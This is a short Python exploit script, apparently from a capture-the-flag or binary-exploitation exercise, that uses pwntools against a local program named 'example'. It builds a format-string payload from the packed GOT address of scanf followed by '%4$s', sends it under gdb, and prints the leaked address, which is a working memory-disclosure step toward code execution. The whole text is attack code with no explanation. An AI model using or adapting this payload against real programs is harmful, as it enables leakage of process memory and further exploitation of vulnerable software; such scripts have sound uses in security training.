from pwn import *

sh = process('./example')

elf = ELF('./example')

scanfgot = elf.got['__isoc99_scanf']

print(hex(scanfgot))

payload = p32(scanfgot) + b'%4$s'

gdb.attach(sh)

sh.sendline(payload)

sh.recvuntil(b'%4$s\n')

print(hex(u32(sh.recv()[4: 8])))

